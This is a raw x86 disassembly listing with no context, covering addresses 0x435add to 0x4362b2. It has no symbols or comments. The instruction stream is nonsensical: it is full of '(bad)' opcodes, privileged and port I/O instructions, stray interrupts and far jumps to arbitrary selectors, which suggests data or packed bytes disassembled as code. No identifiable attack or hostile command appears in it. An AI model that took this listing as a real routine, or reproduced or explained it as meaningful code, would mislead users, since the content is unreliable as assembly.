  435add:	push   ss
  435ade:	sti    
  435adf:	push   ebx
  435ae0:	xor    ch,BYTE PTR [edx]
  435ae2:	icebp  
  435ae3:	inc    edx
  435ae4:	int3   
  435ae5:	loope  0x435ab2
  435ae7:	xor    ah,BYTE PTR [edx+0x6b5d870d]
  435aed:	fadd   QWORD PTR [ebx+0x2c]
  435af0:	sbb    ah,BYTE PTR [edx+0x15]
  435af3:	ret    0xd7c1
  435af6:	in     eax,0x7a
  435af8:	add    edi,DWORD PTR [eax]
  435afa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435afb:	jb     0x435b63
  435afd:	mov    al,ds:0xa01a7cbc
  435b02:	sbb    ah,BYTE PTR [edx-0x484d5cf4]
  435b08:	jl     0x435b67
  435b0a:	push   cs
  435b0b:	inc    ecx
  435b0c:	mov    dl,0xc9
  435b0e:	xor    ebp,esi
  435b10:	fs out dx,ax
  435b13:	std    
  435b14:	fcmovne st,st(1)
  435b16:	pop    ebx
  435b17:	shl    BYTE PTR [eax+edx*4+0xd880b12],0xa1
  435b1f:	pop    es
  435b20:	test   DWORD PTR [esi],edx
  435b22:	jbe    0x435b61
  435b24:	fldenv [ebp+0x3a617750]
  435b2a:	popa   
  435b2b:	ss popa 
  435b2d:	mov    DWORD PTR [ebx],0x70e6dd
  435b33:	adc    eax,0x11ef9a4b
  435b38:	pop    ecx
  435b39:	nop
  435b3a:	and    cl,BYTE PTR [eax+0x24]
  435b3d:	fwait
  435b3e:	(bad)  
  435b3f:	jns    0x435b36
  435b41:	push   ds
  435b42:	mov    esi,0x7133905f
  435b47:	pop    ecx
  435b48:	iret   
  435b49:	push   0xc9ab389f
  435b4e:	mov    ebx,0x25f99319
  435b53:	jae    0x435b9f
  435b55:	cmp    eax,0x41ec7c40
  435b5a:	jl     0x435b60
  435b5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435b5d:	mov    edx,DWORD PTR [edi+0x1a8554a3]
  435b63:	mov    bh,0x8f
  435b65:	sub    eax,0xc351a74d
  435b6a:	mov    ebx,0xd20d1064
  435b6f:	add    al,0xf2
  435b71:	int    0xe9
  435b73:	clc    
  435b74:	push   cs
  435b75:	pop    edx
  435b76:	stos   BYTE PTR es:[edi],al
  435b77:	cs cdq 
  435b79:	fisttp DWORD PTR [esi+0x7a500ae4]
  435b7f:	out    0xe4,eax
  435b81:	ins    BYTE PTR es:[edi],dx
  435b82:	mov    ah,0x74
  435b84:	push   edx
  435b85:	mov    ebp,0x68537f1e
  435b8a:	add    ch,dh
  435b8c:	mov    edx,0xaa2c68f9
  435b91:	and    eax,0xda24a7
  435b96:	and    BYTE PTR [edx+eiz*8],bl
  435b99:	rcl    BYTE PTR [edx+ecx*4+0x2747253a],1
  435ba0:	fcomp  DWORD PTR [eax+ecx*2+0x40]
  435ba4:	ins    BYTE PTR es:[edi],dx
  435ba5:	sub    BYTE PTR [ecx+ebx*1],dh
  435ba8:	cli    
  435ba9:	enter  0x4de9,0x56
  435bad:	and    ecx,esp
  435baf:	push   ss
  435bb0:	dec    esi
  435bb1:	xchg   edx,eax
  435bb2:	mov    esp,0x50ce0748
  435bb7:	mov    al,ds:0xf5fea8b7
  435bbc:	mov    dl,0x5f
  435bbe:	xor    DWORD PTR [eax+0xb],0x79
  435bc2:	in     eax,dx
  435bc3:	arpl   WORD PTR [edx+0x76],si
  435bc6:	arpl   si,cx
  435bc8:	std    
  435bc9:	dec    esi
  435bca:	xchg   esi,eax
  435bcb:	xchg   edi,eax
  435bcc:	fs enter 0x6f6a,0xfc
  435bd1:	jge    0x435c20
  435bd3:	inc    esi
  435bd4:	cmp    al,0x82
  435bd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435bd7:	call   0xaa8b256f
  435bdc:	mov    bl,0x76
  435bde:	arpl   WORD PTR [edx-0x5b],sp
  435be1:	mov    edi,0x4ff7c62f
  435be6:	leave  
  435be7:	loope  0x435c3b
  435be9:	js     0x435bf0
  435beb:	sub    BYTE PTR [eax-0x2abfef7f],cl
  435bf1:	lahf   
  435bf2:	mov    WORD PTR [edi+0x1f],?
  435bf5:	(bad)  
  435bf6:	jle    0x435c56
  435bf8:	mov    edi,DWORD PTR [edi+0x42893d51]
  435bfe:	sbb    al,0x8a
  435c00:	cmp    DWORD PTR [ecx-0x26b3d661],esp
  435c06:	das    
  435c07:	or     esi,DWORD PTR [ebx+0x4c]
  435c0a:	mov    dl,0x3b
  435c0c:	xor    bl,BYTE PTR [ebx+0x10]
  435c0f:	jmp    0x9d36:0xc2039a26
  435c16:	lock inc edi
  435c18:	add    BYTE PTR gs:[ebx+0x4f],cl
  435c1c:	hlt    
  435c1d:	xchg   edi,eax
  435c1e:	adc    bl,ch
  435c20:	mov    ah,0xc
  435c22:	fwait
  435c23:	pop    ebp
  435c24:	xchg   ebp,eax
  435c25:	in     eax,dx
  435c26:	loopne 0x435bdc
  435c28:	into   
  435c29:	pop    esi
  435c2a:	mov    bl,ch
  435c2c:	push   edx
  435c2d:	mov    al,bh
  435c2f:	dec    edx
  435c30:	cmp    al,0xa7
  435c32:	inc    ebx
  435c33:	cbw    
  435c35:	and    ah,bl
  435c37:	adc    al,0x95
  435c39:	sbb    esp,DWORD PTR [edi-0xed719de]
  435c3f:	jne    0x435c0a
  435c41:	cmp    DWORD PTR [esp],ecx
  435c44:	xor    BYTE PTR [ecx-0x2d3fd652],0x14
  435c4b:	std    
  435c4c:	ins    BYTE PTR es:[edi],dx
  435c4d:	mov    esi,DWORD PTR [esi-0x7f]
  435c50:	inc    ebp
  435c51:	test   eax,0x441b7191
  435c56:	mov    esi,0x84633fe8
  435c5b:	push   ss
  435c5c:	mov    WORD PTR [esi],es
  435c5e:	add    dl,BYTE PTR [esi+0x9a4725f]
  435c64:	inc    edi
  435c65:	cmp    edx,edi
  435c67:	add    BYTE PTR [ebx+eax*8+0x11],bl
  435c6b:	or     al,0xdd
  435c6d:	sbb    cl,dh
  435c6f:	inc    edi
  435c70:	cmp    BYTE PTR ds:0x85c882d1,ch
  435c76:	and    DWORD PTR [edi+0x66],eax
  435c79:	ss fwait
  435c7b:	lahf   
  435c7c:	pushf  
  435c7d:	rcr    DWORD PTR [eax+0x7d212770],0xe
  435c84:	sbb    edi,esp
  435c86:	jb     0x435ced
  435c88:	pop    ds
  435c89:	rcl    BYTE PTR [eax-0x50],0x2
  435c8d:	xor    ebp,DWORD PTR [ecx]
  435c8f:	jns    0x435cba
  435c91:	es ret 0x1407
  435c95:	pop    ebx
  435c96:	rcl    BYTE PTR [esi+0x43],0x2d
  435c9a:	ret    
  435c9b:	jns    0x435c34
  435c9d:	dec    esi
  435c9e:	push   0xb1bbbb6c
  435ca3:	nop
  435ca4:	jo     0x435d00
  435ca6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435ca7:	dec    ecx
  435ca8:	int    0xd3
  435caa:	jb     0x435cfd
  435cac:	test   edx,ebp
  435cae:	gs (bad) 
  435cb0:	xor    BYTE PTR [esp+esi*1-0x69],cl
  435cb4:	fs add cl,dl
  435cb7:	retf   
  435cb8:	mov    dl,0x9d
  435cba:	cwde   
  435cbb:	es jnp 0x435ce0
  435cbe:	mov    esi,0x9258e343
  435cc3:	in     eax,dx
  435cc4:	jp     0x435c9a
  435cc6:	cmp    BYTE PTR [eax],dh
  435cc8:	icebp  
  435cc9:	mov    al,0xaa
  435ccb:	and    dl,cl
  435ccd:	adc    eax,0xff6f1c8b
  435cd2:	js     0x435d20
  435cd4:	and    al,0xe4
  435cd6:	xchg   ebx,eax
  435cd7:	push   esp
  435cd8:	add    eax,0x800b1e82
  435cdd:	cmove  ebx,DWORD PTR [ebp-0x75d7b17c]
  435ce4:	push   ecx
  435ce5:	adc    ebp,edi
  435ce7:	and    eax,0xb0fa0b2e
  435cec:	cmp    DWORD PTR [ebx+0x2bf7dc96],edi
  435cf2:	jb     0x435cf6
  435cf4:	dec    eax
  435cf5:	call   0x552c:0xa721398
  435cfc:	xchg   ecx,eax
  435cfd:	mov    esi,0x38487ba5
  435d02:	jb     0x435d1d
  435d04:	fisub  DWORD PTR [edx+ecx*1+0x72]
  435d08:	pushf  
  435d09:	inc    edx
  435d0a:	test   eax,0x59e2a7cd
  435d0f:	xchg   DWORD PTR [ebp+0x75],esp
  435d12:	pop    DWORD PTR [ebp-0x48]
  435d15:	adc    al,0xcf
  435d17:	fcom   DWORD PTR [edi+0x15360dcd]
  435d1d:	data16 xlat BYTE PTR ds:[ebx]
  435d1f:	sub    ah,0x68
  435d22:	cld    
  435d23:	inc    edx
  435d24:	cld    
  435d25:	dec    esi
  435d26:	sbb    BYTE PTR ds:[ecx],0x39
  435d2a:	loope  0x435cb3
  435d2c:	mov    cl,0xa0
  435d2e:	enter  0x6cc8,0xcc
  435d32:	outs   dx,DWORD PTR ds:[esi]
  435d33:	sub    DWORD PTR [esi+edi*4+0x7906c5f6],0x50
  435d3b:	push   es
  435d3c:	mov    ecx,DWORD PTR [ebp-0x37]
  435d3f:	hlt    
  435d40:	shr    DWORD PTR [eax+0x4e],cl
  435d43:	test   al,bl
  435d45:	enter  0xc438,0xd4
  435d49:	sbb    BYTE PTR [ebp-0x58cb2e11],cl
  435d4f:	arpl   WORD PTR ds:0x6141925c,bp
  435d55:	push   esp
  435d56:	dec    edi
  435d57:	ret    0x45b1
  435d5a:	test   DWORD PTR [eax],ebp
  435d5c:	loop   0x435d41
  435d5e:	push   0x5317bc36
  435d63:	push   0x48
  435d65:	push   esi
  435d66:	fnstsw WORD PTR [ecx]
  435d68:	sub    ecx,edx
  435d6a:	cs daa 
  435d6c:	fs pop es
  435d6e:	sub    esp,ebp
  435d70:	in     al,dx
  435d71:	loope  0x435d52
  435d73:	mov    ds:0x5c87779c,eax
  435d78:	cs or  eax,0x89f337f8
  435d7e:	push   esi
  435d7f:	add    BYTE PTR [eax+0x0],0xd
  435d83:	dec    ebx
  435d84:	fcomp  DWORD PTR [ebx+0x18b31d13]
  435d8a:	aas    
  435d8b:	dec    edi
  435d8c:	dec    esi
  435d8d:	scas   al,BYTE PTR es:[edi]
  435d8e:	xor    BYTE PTR [esi-0x78f80ff4],0xea
  435d95:	leave  
  435d96:	clc    
  435d97:	in     al,dx
  435d98:	push   edx
  435d99:	int3   
  435d9a:	das    
  435d9b:	pop    edx
  435d9c:	xor    ebx,ebp
  435d9e:	cmp    al,BYTE PTR [edi]
  435da0:	repnz and BYTE PTR [eax+eax*1+0x3d],ch
  435da5:	rol    DWORD PTR [edx-0x7c],0x66
  435da9:	xchg   ebp,eax
  435daa:	push   edi
  435dab:	or     al,dl
  435dad:	cdq    
  435dae:	cmp    eax,0x20dfe725
  435db3:	add    bl,cl
  435db5:	pushf  
  435db6:	add    BYTE PTR [ebx-0x3f],0x8
  435dba:	add    al,0x8a
  435dbc:	sub    DWORD PTR [edi],ecx
  435dbe:	jge    0x435da0
  435dc0:	cmp    al,0x2
  435dc2:	cwde   
  435dc3:	inc    eax
  435dc4:	cld    
  435dc5:	sahf   
  435dc6:	rcr    ah,cl
  435dc8:	adc    al,0x6d
  435dca:	add    BYTE PTR [ebp-0x157cb27c],ah
  435dd0:	fild   QWORD PTR ds:0x53503d03
  435dd6:	push   edx
  435dd7:	add    eax,ecx
  435dd9:	je     0x435d9e
  435ddb:	lods   eax,DWORD PTR ds:[esi]
  435ddc:	(bad)  
  435ddd:	sub    DWORD PTR [ebp+0x4f701c47],ecx
  435de3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435de4:	mov    WORD PTR [edx+ebx*2-0x69],fs
  435de8:	cmp    eax,0x10b1fda9
  435ded:	cmp    DWORD PTR [ecx-0x10],ebx
  435df0:	out    0xe7,al
  435df2:	mov    ch,0xe2
  435df4:	cmp    ah,ch
  435df6:	int    0xbf
  435df8:	das    
  435df9:	shr    DWORD PTR [ebx+eiz*4+0x16],cl
  435dfd:	or     eax,0xe23afbc5
  435e02:	cmp    ebp,eax
  435e04:	cdq    
  435e05:	and    BYTE PTR [ebx+eiz*8],0xa0
  435e09:	retf   0xa5a9
  435e0c:	mov    bl,dl
  435e0e:	xor    dl,0x4b
  435e11:	xlat   BYTE PTR ds:[ebx]
  435e12:	mov    esp,0xde802d9e
  435e17:	sbb    BYTE PTR [edi+0x21cf710b],cl
  435e1d:	sbb    DWORD PTR [esp+edx*4-0x26],ebx
  435e21:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435e23:	pushf  
  435e24:	into   
  435e25:	dec    ecx
  435e26:	ror    BYTE PTR [edx],cl
  435e28:	push   ebp
  435e29:	(bad)  
  435e2a:	mov    cs,edx
  435e2c:	stos   BYTE PTR es:[edi],al
  435e2d:	sbb    DWORD PTR [esi+edx*2+0x74686537],edx
  435e34:	addr16 hlt 
  435e36:	pop    ds
  435e37:	jae    0x435e9e
  435e39:	pop    eax
  435e3a:	mov    dh,0x19
  435e3c:	or     ebx,esp
  435e3e:	push   esi
  435e3f:	(bad)  
  435e40:	loop   0x435dd3
  435e42:	pop    esp
  435e43:	in     eax,dx
  435e44:	or     BYTE PTR [edi+0x4893d515],al
  435e4a:	and    eax,0xb39e4a5
  435e4f:	sti    
  435e50:	(bad)  
  435e51:	(bad)  
  435e53:	sub    edi,esp
  435e55:	xor    eax,0x5650c94c
  435e5a:	dec    esi
  435e5b:	mul    BYTE PTR [ebp+0x19]
  435e5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435e5f:	pop    edx
  435e60:	pop    ds
  435e61:	xlat   BYTE PTR ds:[ebx]
  435e62:	inc    ebx
  435e63:	loope  0x435eab
  435e65:	xchg   edx,eax
  435e66:	adc    BYTE PTR [eax+0x62],dl
  435e69:	mov    ds:0xc1ea5403,al
  435e6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435e6f:	test   bl,ah
  435e71:	and    DWORD PTR ds:0x794cb8ff,edi
  435e77:	push   es
  435e78:	xchg   BYTE PTR [edi+esi*8],ah
  435e7b:	sub    eax,0x74e1b325
  435e80:	jl     0x435ec8
  435e82:	sub    BYTE PTR [eax+0x7c989a62],dl
  435e88:	cmp    BYTE PTR [ecx+eax*4+0x46ce2f5],ah
  435e8f:	gs pop es
  435e91:	aaa    
  435e92:	inc    DWORD PTR [esi+0x43478f1c]
  435e98:	inc    ebp
  435e99:	jecxz  0x435eff
  435e9b:	ins    BYTE PTR es:[edi],dx
  435e9c:	add    DWORD PTR [edi],esi
  435e9e:	xchg   ecx,eax
  435e9f:	gs dec eax
  435ea1:	dec    edx
  435ea2:	cmp    al,0xeb
  435ea4:	adc    al,0x6e
  435ea6:	mov    BYTE PTR [ecx+ecx*1+0xe0a5e0a],bl
  435ead:	mov    ecx,0xb3e41d2a
  435eb2:	fmul   st,st(3)
  435eb4:	scas   al,BYTE PTR es:[edi]
  435eb5:	scas   eax,DWORD PTR es:[edi]
  435eb6:	mov    gs,edi
  435eb8:	enter  0x2490,0x15
  435ebc:	push   ds
  435ebd:	mov    bl,0x83
  435ebf:	shl    BYTE PTR [eax+eax*8-0x1f],cl
  435ec3:	xor    DWORD PTR [ecx-0x10],ecx
  435ec6:	add    eax,DWORD PTR [eax]
  435ec8:	or     dl,0x53
  435ecb:	mov    eax,ds:0x81d074e7
  435ed0:	dec    esp
  435ed1:	mov    edx,0xece53c
  435ed6:	jne    0x435e79
  435ed8:	dec    ecx
  435ed9:	adc    eax,DWORD PTR [ecx+0xf1f9b28]
  435edf:	test   BYTE PTR [esi+0x42],al
  435ee2:	and    eax,0xb17ad81c
  435ee7:	iret   
  435ee8:	add    DWORD PTR [ecx-0x68a7fa80],ebp
  435eee:	cdq    
  435eef:	pop    esi
  435ef0:	add    DWORD PTR [eax],0x69531ea3
  435ef6:	xchg   DWORD PTR [ebx-0x6e],edx
  435ef9:	inc    edx
  435efa:	mov    al,ah
  435efc:	(bad)  [ecx-0x7220b519]
  435f02:	retf   0xd86a
  435f05:	jbe    0x435f83
  435f07:	(bad)  
  435f08:	in     al,0x1
  435f0a:	cwde   
  435f0b:	cmp    bl,0x8c
  435f0e:	in     al,0x1e
  435f10:	adc    ch,BYTE PTR [edi]
  435f12:	mov    cs,ecx
  435f14:	test   BYTE PTR [eax],bl
  435f16:	fdiv   DWORD PTR [ebp-0x75]
  435f19:	(bad)  
  435f1b:	(bad)  
  435f1c:	retf   
  435f1d:	dec    ecx
  435f1e:	mov    ebx,0x11a11b08
  435f23:	fmul   QWORD PTR [esi+0x336163c1]
  435f29:	push   ecx
  435f2a:	inc    eax
  435f2b:	fnstenv es:[eax-0x28]
  435f2f:	pop    esp
  435f30:	jo     0x435f06
  435f32:	(bad)  
  435f34:	sar    DWORD PTR [eax+0x7499c039],0x32
  435f3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435f3c:	push   ebx
  435f3d:	jl     0x435f87
  435f3f:	push   es
  435f40:	loopne 0x435ece
  435f42:	les    esp,FWORD PTR [edx-0x6f7431fe]
  435f48:	loop   0x435ece
  435f4a:	shl    BYTE PTR [esi],0x86
  435f4d:	jnp    0x435f6d
  435f4f:	mov    edx,0xb10dda2e
  435f54:	inc    ebp
  435f55:	arpl   WORD PTR [edx+edx*4+0x74],bp
  435f59:	out    dx,eax
  435f5a:	xor    eax,0x95eeeed9
  435f5f:	mov    ds:0x3876d80b,eax
  435f64:	data16 loope 0x435f19
  435f67:	dec    edi
  435f68:	out    dx,eax
  435f69:	jg     0x435f8f
  435f6b:	(bad)  
  435f6c:	addr16 dec edx
  435f6e:	dec    esi
  435f6f:	add    ebp,0xffffff9c
  435f72:	call   0xba15:0x54881d94
  435f79:	and    al,0x67
  435f7b:	xor    BYTE PTR [edx+0x27],dl
  435f7e:	adc    DWORD PTR [eax+0x30],0xf8b9d4f0
  435f85:	jg     0x435fb9
  435f87:	std    
  435f88:	push   ds
  435f89:	xchg   ebx,eax
  435f8a:	popa   
  435f8b:	mov    ch,0xcc
  435f8d:	sbb    eax,0x4a98502c
  435f92:	xchg   edx,eax
  435f93:	mov    bl,0x2a
  435f95:	dec    ecx
  435f96:	mov    BYTE PTR [edx+0x6647b4a0],0x2a
  435f9d:	cmp    bl,BYTE PTR [ebx]
  435f9f:	repz or BYTE PTR [eax-0x2423b11b],ah
  435fa6:	sbb    esp,ebx
  435fa8:	sahf   
  435fa9:	fdivrp st(7),st
  435fab:	push   0xaea84f7c
  435fb0:	dec    edx
  435fb1:	ss sbb eax,0xf6a40288
  435fb7:	popf   
  435fb8:	xchg   ebx,eax
  435fb9:	adc    edx,DWORD PTR [ebx-0x6ea20590]
  435fbf:	leave  
  435fc0:	cmp    BYTE PTR ss:[edx+edx*4+0x8398590],ch
  435fc8:	aas    
  435fc9:	add    esi,esi
  435fcb:	xor    ecx,esp
  435fcd:	dec    edx
  435fce:	(bad)  
  435fcf:	push   cs
  435fd0:	sbb    edi,DWORD PTR [ebx]
  435fd2:	aas    
  435fd3:	sub    al,0x10
  435fd5:	push   esp
  435fd6:	xchg   edx,eax
  435fd7:	xor    DWORD PTR [edi],ebx
  435fd9:	or     BYTE PTR [esi+0x28],ah
  435fdc:	ficomp DWORD PTR [edx-0x1b]
  435fdf:	sub    al,0x53
  435fe1:	int3   
  435fe2:	add    eax,ebp
  435fe4:	mov    esi,0xa23d63ba
  435fe9:	jno    0x435f7c
  435feb:	add    eax,0x43573399
  435ff0:	sti    
  435ff1:	(bad)  
  435ff4:	pop    eax
  435ff5:	xchg   edx,eax
  435ff6:	sbb    eax,DWORD PTR [eax-0x39b19171]
  435ffc:	retf   0xdfe4
  435fff:	jecxz  0x435fec
  436001:	ret    0x42b4
  436004:	clc    
  436005:	xchg   ebp,eax
  436006:	repz sub BYTE PTR [esi],al
  436009:	add    ecx,DWORD PTR [eax]
  43600b:	inc    esp
  43600c:	sub    al,0x3c
  43600e:	daa    
  43600f:	adc    eax,0x539d1b84
  436014:	adc    eax,0x38d21e36
  436019:	repz call 0xda4d:0x6639257d
  436021:	xor    cl,ah
  436023:	lahf   
  436024:	mov    ah,0x58
  436026:	cs retf 
  436028:	push   0x7f
  43602a:	pop    edx
  43602b:	or     al,0xa3
  43602d:	jb     0x436017
  43602f:	mov    al,BYTE PTR [edx-0x1e5a9b67]
  436035:	popf   
  436036:	and    eax,0x8790514
  43603b:	lods   al,BYTE PTR ds:[esi]
  43603c:	mov    edx,0x439d925
  436041:	and    esi,eax
  436043:	mov    al,ds:0x9790da4c
  436048:	aas    
  436049:	and    ch,BYTE PTR [edx+eax*1]
  43604c:	repz or eax,0x3a986314
  436052:	inc    edi
  436053:	gs out dx,eax
  436055:	cli    
  436056:	int    0xb8
  436058:	ds xchg edi,eax
  43605a:	idiv   BYTE PTR [eax]
  43605c:	dec    ebp
  43605d:	mov    al,ds:0xa1226694
  436062:	sahf   
  436063:	mov    esi,0x4732c32e
  436068:	add    DWORD PTR fs:[ecx+esi*4],0x63bc7cc6
  436070:	cmp    bh,dl
  436072:	ror    DWORD PTR [ecx+0x138b7202],0x9f
  436079:	pop    eax
  43607a:	sti    
  43607b:	xchg   edx,eax
  43607c:	pushf  
  43607d:	lods   al,BYTE PTR ds:[esi]
  43607e:	ret    
  43607f:	es and ebx,edi
  436082:	or     eax,0x8fbd2bcd
  436087:	sub    al,0x47
  436089:	dec    esi
  43608a:	int    0x2b
  43608c:	mov    cl,0xb9
  43608e:	mov    cs,eax
  436090:	mov    cl,0x7a
  436092:	jmp    0x2cb0:0xfbd293ca
  436099:	and    al,0x53
  43609b:	pop    eax
  43609c:	icebp  
  43609d:	dec    esp
  43609e:	int3   
  43609f:	push   edi
  4360a0:	jp     0x436080
  4360a2:	cwde   
  4360a3:	or     al,0x30
  4360a5:	inc    edx
  4360a6:	fld    QWORD PTR [edi+0x8]
  4360a9:	dec    ecx
  4360aa:	ss and edx,esi
  4360ad:	mov    dl,0xb5
  4360af:	push   ecx
  4360b0:	and    eax,DWORD PTR [ebx+0x2b6d7258]
  4360b6:	ins    DWORD PTR es:[edi],dx
  4360b7:	pop    esp
  4360b8:	clc    
  4360b9:	push   ss
  4360ba:	rol    DWORD PTR [edi],0xc0
  4360bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4360be:	aas    
  4360bf:	das    
  4360c0:	push   edi
  4360c1:	pop    ebp
  4360c2:	inc    esi
  4360c3:	loopne 0x436066
  4360c5:	adc    ah,BYTE PTR [ebx-0x7d]
  4360c8:	jecxz  0x43611d
  4360ca:	leave  
  4360cb:	int    0x45
  4360cd:	jl     0x436106
  4360cf:	test   BYTE PTR [ecx-0x57],dh
  4360d2:	lock add ebp,DWORD PTR [edi+0x22]
  4360d6:	shl    BYTE PTR [esp+ebx*1-0x4e],1
  4360da:	loopne 0x4360d4
  4360dc:	jae    0x4360a6
  4360de:	mov    ?,WORD PTR cs:[ecx]
  4360e1:	dec    esi
  4360e2:	inc    esp
  4360e3:	(bad)  
  4360e4:	das    
  4360e5:	inc    eax
  4360e6:	sbb    eax,0xac40ee04
  4360eb:	aaa    
  4360ec:	sbb    al,0xe2
  4360ee:	mov    bh,0xb3
  4360f0:	(bad)  
  4360f1:	jae    0x4360a5
  4360f3:	vpshld xmm0,[ecx+edx*4-0x6d623cb7],xmm4
  4360fd:	fnstenv [ecx+ecx*4-0x33a02fc0]
  436104:	or     ah,al
  436106:	aad    0xd8
  436108:	out    dx,al
  436109:	jnp    0x43613d
  43610b:	sub    BYTE PTR [esi],cl
  43610d:	or     eax,0x18cb4d85
  436112:	dec    eax
  436113:	mov    gs,WORD PTR [edx-0x30]
  436116:	pop    ds
  436117:	xor    al,0x1d
  436119:	jl     0x436133
  43611b:	sbb    al,0x9a
  43611d:	adc    al,0xb0
  43611f:	loope  0x436151
  436121:	mov    cl,0x4a
  436124:	xor    ecx,ebx
  436126:	aad    0xe8
  436128:	push   edi
  436129:	cdq    
  43612a:	(bad)  
  43612c:	cmp    edx,DWORD PTR [edi+0x344ca9ca]
  436132:	stos   BYTE PTR es:[edi],al
  436133:	pop    es
  436134:	test   BYTE PTR [ecx+ebp*2],0xac
  436138:	pushf  
  436139:	cwde   
  43613a:	inc    esp
  43613b:	add    eax,0x1201e272
  436140:	gs jo  0x4361bf
  436143:	sar    DWORD PTR [eax+0x73],0x4d
  436147:	(bad)  
  436148:	int3   
  436149:	(bad)
  43614d:	in     al,0x3a
  43614f:	jae    0x43612b
  436151:	adc    bl,BYTE PTR [edi-0x5b]
  436154:	push   ss
  436155:	pop    ds
  436156:	sub    ch,BYTE PTR [ebx]
  436158:	fdiv   st(4),st
  43615a:	or     BYTE PTR ds:0xbbd856c2,dl
  436160:	dec    eax
  436161:	out    dx,eax
  436162:	aam    0xd1
  436164:	stos   DWORD PTR es:[edi],eax
  436165:	jb     0x4361d8
  436167:	mov    ebp,DWORD PTR [edx]
  436169:	cmp    ebx,esi
  43616b:	or     ebp,DWORD PTR [eax+0x25]
  43616e:	pop    esp
  43616f:	add    al,ah
  436171:	int    0x31
  436173:	popa   
  436174:	repnz push 0x8376108
  43617a:	dec    edi
  43617b:	pusha  
  43617c:	mov    edx,0x92f991c1
  436181:	sbb    al,0xa3
  436183:	lds    eax,FWORD PTR [ecx+eiz*1-0x7c584c84]
  43618a:	dec    esp
  43618b:	lods   al,BYTE PTR ds:[esi]
  43618c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43618d:	mov    ds:0x8972eb2f,eax
  436192:	push   0x70d1e938
  436197:	mov    al,ds:0xe82a4f0f
  43619c:	sub    edi,DWORD PTR [edx]
  43619e:	cwde   
  43619f:	inc    ecx
  4361a0:	jns    0x4361fa
  4361a2:	push   es
  4361a3:	mov    cl,0x48
  4361a5:	push   ss
  4361a6:	inc    esp
  4361a7:	push   0x4ecb200b
  4361ac:	retf   
  4361ad:	xor    eax,0x93f8a90f
  4361b2:	scas   al,BYTE PTR es:[edi]
  4361b3:	and    eax,0x24880744
  4361b8:	int    0x27
  4361ba:	cmp    al,0xa
  4361bc:	clc    
  4361bd:	or     DWORD PTR [eax+0x44ac604b],ebx
  4361c3:	xor    dl,BYTE PTR [eax]
  4361c5:	push   esi
  4361c6:	cmp    BYTE PTR [ecx-0x13f996b8],ah
  4361cc:	inc    edx
  4361cd:	adc    dl,BYTE PTR [edi+eiz*1]
  4361d0:	cld    
  4361d1:	fstp   QWORD PTR [eax+0x58]
  4361d4:	inc    edi
  4361d5:	in     eax,0x8a
  4361d7:	dec    esi
  4361d8:	mov    bh,0xe3
  4361da:	(bad)  
  4361dc:	mov    dl,0x8f
  4361de:	popa   
  4361df:	pop    ecx
  4361e0:	pop    dx
  4361e2:	ret    0x4f5b
  4361e5:	sub    BYTE PTR [eax+ebx*2-0x270b8ac2],cl
  4361ec:	and    BYTE PTR [ebp+eax*4+0x701cc6d7],ah
  4361f3:	repnz push ebx
  4361f5:	gs xchg edi,eax
  4361f7:	cwde   
  4361f8:	cmp    al,BYTE PTR [edi+0x40a5fd08]
  4361fe:	pop    es
  4361ff:	sbb    BYTE PTR [edx-0x42c6bd56],0xd7
  436206:	int    0x78
  436208:	into   
  436209:	push   ebx
  43620a:	mov    dl,0xff
  43620c:	xchg   ecx,esi
  43620e:	pop    ecx
  43620f:	xchg   esp,eax
  436210:	inc    ebx
  436211:	ins    DWORD PTR es:[edi],dx
  436212:	cmp    BYTE PTR [ecx+0x3112fd81],bl
  436218:	xchg   ecx,eax
  436219:	push   cs
  43621a:	(bad)  
  43621b:	inc    edi
  43621c:	pop    esp
  43621d:	xchg   ebp,eax
  43621e:	push   ebx
  43621f:	xchg   DWORD PTR [ecx],esp
  436221:	and    DWORD PTR [ecx+0x7b30017e],0xf1757c42
  43622b:	outs   dx,DWORD PTR ds:[esi]
  43622c:	push   esp
  43622d:	xchg   sp,ax
  43622f:	and    ah,BYTE PTR [edx]
  436231:	add    BYTE PTR [eax],0xcd
  436234:	mov    ecx,DWORD PTR [edx+eax*2+0x1c584703]
  43623b:	adc    BYTE PTR [ebx+0x1e],bl
  43623e:	fldenv [eax]
  436240:	xor    al,BYTE PTR [edx+0x48]
  436243:	xchg   esp,eax
  436244:	icebp  
  436245:	les    edx,FWORD PTR [edi]
  436247:	mov    eax,ds:0x24652758
  43624c:	and    dl,ch
  43624e:	push   es
  43624f:	sub    DWORD PTR [ecx-0x64785d4],ebp
  436255:	or     BYTE PTR [edi-0x70],ah
  436258:	adc    ebp,0x2a84bd94
  43625e:	mov    ebp,0x40b013e4
  436263:	push   edx
  436264:	arpl   WORD PTR [edi+0x65e745e3],ax
  43626a:	push   esp
  43626b:	pusha  
  43626c:	ja     0x436244
  43626e:	adc    BYTE PTR [edi+eax*2+0x7c],dl
  436272:	psubusb mm0,QWORD PTR [ebx+esi*2-0x27]
  436277:	loop   0x43627c
  436279:	dec    ebx
  43627a:	sub    ch,0x43
  43627d:	adc    eax,0x4bcd6a22
  436282:	dec    esi
  436283:	rol    al,0xdf
  436286:	push   eax
  436287:	and    DWORD PTR [ebx],esi
  436289:	mov    dh,0xe0
  43628b:	loopne 0x43624e
  43628d:	xor    ecx,DWORD PTR [edx+edx*1]
  436290:	push   0x42
  436292:	mov    dh,0xc7
  436294:	sbb    BYTE PTR [ebp+ebp*8+0x16f83fac],ah
  43629b:	lock sahf 
  43629d:	push   edx
  43629e:	push   ds
  43629f:	cmp    esi,DWORD PTR [ebp-0xad3790b]
  4362a5:	icebp  
  4362a6:	lods   al,BYTE PTR ds:[esi]
  4362a7:	xchg   edx,eax
  4362a8:	push   ebp
  4362a9:	inc    esi
  4362aa:	ins    DWORD PTR es:[edi],dx
  4362ab:	ds xor ch,ch
  4362ae:	dec    eax
  4362af:	jno    0x43632f
  4362b1:	inc    ebp
  4362b2:	inc    esi
